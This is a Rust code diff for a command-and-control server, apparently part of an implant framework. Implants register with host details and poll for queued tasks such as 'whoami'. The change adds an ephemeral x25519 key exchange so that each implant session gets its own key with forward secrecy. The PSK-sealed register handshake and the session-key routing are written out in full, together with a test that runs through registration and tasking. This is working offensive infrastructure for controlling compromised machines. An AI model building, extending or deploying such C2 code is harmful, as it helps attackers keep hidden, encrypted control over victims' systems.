@@ -15,6 +15,19 @@ fn derive_session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
     crypto::derive_key(psk, b"nw-m1-salt")
 }
 
+fn decode_key(s: &str) -> Result<[u8; 32], ()> {
+    use base64::Engine;
+    let raw = base64::engine::general_purpose::STANDARD
+        .decode(s)
+        .map_err(|_| ())?;
+    <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| ())
+}
+
+fn encode_key(k: &[u8; 32]) -> String {
+    use base64::Engine;
+    base64::engine::general_purpose::STANDARD.encode(k)
+}
+
 /// Cryptographic wrappers for one session key.
 struct Cipher {
     key: [u8; crypto::KEY_LEN],
@@ -51,6 +64,8 @@ fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Er
     if env.session_id.is_some() {
         return Err(C2Error::BadRequest);
     }
+    // The register handshake is authenticated with the PSK-derived key; this is
+    // what ties the implant to the shared secret before any session key exists.
     let cipher = Cipher::new(derive_session_key(&state.psk));
     let pt = cipher
         .unwrap(env.id, &env.encrypted)
@@ -58,10 +73,18 @@ fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Er
     let reg: Register =
         serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;
 
-    // M1 uses the shared PSK to derive the session key on both sides; the
-    // echoed field is validation only. Forward secrecy via x25519 replaces
-    // the PSK in M2.
-    let session_key = derive_session_key(&state.psk);
+    // Forward-secrecy handshake: each side rolls an ephemeral x25519 key and
+    // DHs them inside the PSK-authenticated register/ack exchange. The derived
+    // key is unique per registration and unused by any other session, so
+    // compromising a session key (or the PSK later) does not reveal traffic
+    // under a different session key.
+    let implant_pub = decode_key(&reg.session_key).map_err(|_| C2Error::BadRequest)?;
+    let server_kp = crypto::KeyPair::generate();
+    let shared = server_kp
+        .shared_secret(&implant_pub)
+        .map_err(|_| C2Error::Unauthorized)?;
+    let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);
+
     let sid = state.registry.create(
         reg.hostname,
         reg.username,
@@ -72,13 +95,14 @@ fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Er
         session_key,
     );
 
-    let ack = RegisterAck { session_id: sid };
+    let ack = RegisterAck { session_id: sid, server_pub: encode_key(&server_kp.public_key()) };
     let reply_id = env.id + 1;
     let plaintext =
         serde_json::to_vec(&ack).map_err(|_| C2Error::Internal("serialize ack".into()))?;
-    // Ciphertext AAD must match the reply envelope's own id, which is
-    // request id + 1.
-    let out = crypto::encrypt(&session_key, reply_id, &plaintext)
+    // The ack is contained in the PSK-sealed register reply, so the implant can
+    // decrypt it before it has derived the DH session key. The session key
+    // encrypts only subsequent (poll) traffic.
+    let out = crypto::encrypt(&derive_session_key(&state.psk), reply_id, &plaintext)
         .map_err(|_| C2Error::Internal("encrypt ack".into()))?;
     Ok(Envelope::new(Kind::RegisterAck, reply_id, Some(sid), out))
 }
@@ -134,18 +158,31 @@ fn to_status(e: C2Error) -> axum::http::StatusCode {
     }
 }
 
-/// Open a sealed inbound frame with the PSK-derived key, dispatch, then re-seal
-/// the reply. In M1 both register and session envelopes use the same key, so one
-/// key seals everything on the wire (forward secrecy arrives in M2).
+/// Open a sealed inbound frame, dispatch it, and re-seal the reply. The clear
+/// routing `session_id` selects the per-session DH key; a frame without one is
+/// a pre-registration register, which uses the PSK-derived key.
 pub fn process_sealed(state: &ServerState, wire: &[u8]) -> Result<Vec<u8>, C2Error> {
-    let key = derive_session_key(&state.psk);
     let wire_str = std::str::from_utf8(wire).map_err(|_| C2Error::BadRequest)?;
-    let env = Envelope::open(&key, wire_str).map_err(|_| C2Error::Unauthorized)?;
+    // Peek the clear routing id; None => register (PSK key), Some => session.
+    let in_key = match Envelope::routing_id(wire_str) {
+        None => derive_session_key(&state.psk),
+        Some(sid) => resolve_session_key(state, &sid)?,
+    };
+    let env = Envelope::open(&in_key, wire_str).map_err(|_| C2Error::Unauthorized)?;
     let reply = process(state, env)?;
+    // The reply rides the same key as the request it answers.
     let sealed = reply
-        .seal(&key)
+        .seal(&in_key)
         .map_err(|_| C2Error::Internal("seal reply".into()))?;
     Ok(sealed.into_bytes())
+}
+
+fn resolve_session_key(state: &ServerState, sid: &uuid::Uuid) -> Result<[u8; crypto::KEY_LEN], C2Error> {
+    state
+        .registry
+        .get(sid)
+        .map(|s| s.key)
+        .ok_or(C2Error::Unauthorized)
 }
 
 async fn checkin_http(
@@ -217,6 +254,7 @@ mod tests {
         let psk_key = derive_session_key(b"test-psk");
 
         // register: seal the whole frame, POST to the single /c2/checkin.
+        let implant_kp = crypto::KeyPair::generate();
         let reg = nw_profile::msgs::Register {
             hostname: "box".into(),
             username: "alice".into(),
@@ -224,7 +262,7 @@ mod tests {
             arch: "x86_64".into(),
             pid: 42,
             addr: "10.0.0.5".into(),
-            session_key: base64_encode(psk_key),
+            session_key: base64_encode(&implant_kp.public_key()),
         };
         let reg_plain = serde_json::to_vec(&reg).unwrap();
         let reg_ct = crypto::encrypt(&psk_key, 1, &reg_plain).unwrap();
@@ -245,18 +283,24 @@ mod tests {
         assert_eq!(resp.status(), StatusCode::OK);
         let ack_wire = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
         let ack_wire = std::str::from_utf8(&ack_wire).unwrap();
+        // The ack reply is sealed with the PSK key (register phase).
         let ack = Envelope::open(&psk_key, ack_wire).unwrap();
-        // Register reply envelope has id = request id + 1 -> 1 + 1 = 2.
         let ack_pt = crypto::decrypt(&psk_key, 2, &ack.encrypted).unwrap();
         let ack_msg: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();
+
+        // Derive the shared session key exactly as the implantation does, then
+        // seal the poll under it (registration is complete).
+        let server_pub = deb64(&ack_msg.server_pub).unwrap();
+        let shared = implant_kp.shared_secret(&server_pub).unwrap();
+        let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);
 
         // poll with a queued task
         q.push(&ack_msg.session_id, "whoami".into(), vec![], 1000)
             .unwrap();
         let poll_plain = serde_json::to_vec(&PollRequest::default()).unwrap();
-        let poll_ct = crypto::encrypt(&psk_key, 2, &poll_plain).unwrap();
+        let poll_ct = crypto::encrypt(&session_key, 2, &poll_plain).unwrap();
         let poll_env = Envelope::new(Kind::TaskResult, 2, Some(ack_msg.session_id), poll_ct);
-        let poll_body = poll_env.seal(&psk_key).unwrap().into_bytes();
+        let poll_body = poll_env.seal(&session_key).unwrap().into_bytes();
         let resp2 = app
             .oneshot(
                 Request::builder()
@@ -271,16 +315,24 @@ mod tests {
         assert_eq!(resp2.status(), StatusCode::OK);
         let reply_wire = axum::body::to_bytes(resp2.into_body(), usize::MAX).await.unwrap();
         let reply_wire = std::str::from_utf8(&reply_wire).unwrap();
-        let reply = Envelope::open(&psk_key, reply_wire).unwrap();
+        let reply = Envelope::open(&session_key, reply_wire).unwrap();
         // Poll reply envelope has id = request id + 1 -> 2 + 1 = 3.
-        let reply_pt = crypto::decrypt(&psk_key, 3, &reply.encrypted).unwrap();
+        let reply_pt = crypto::decrypt(&session_key, 3, &reply.encrypted).unwrap();
         let pr: PollReply = serde_json::from_slice(&reply_pt).unwrap();
         assert_eq!(pr.tasks.len(), 1);
         assert_eq!(pr.tasks[0].command, "whoami");
     }
 
-    fn base64_encode(b: [u8; 32]) -> String {
+    fn base64_encode(b: &[u8; 32]) -> String {
         use base64::Engine;
         base64::engine::general_purpose::STANDARD.encode(b)
+    }
+
+    fn deb64(s: &str) -> Result<[u8; 32], ()> {
+        use base64::Engine;
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(s)
+            .map_err(|_| ())?;
+        <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| ())
     }
 }
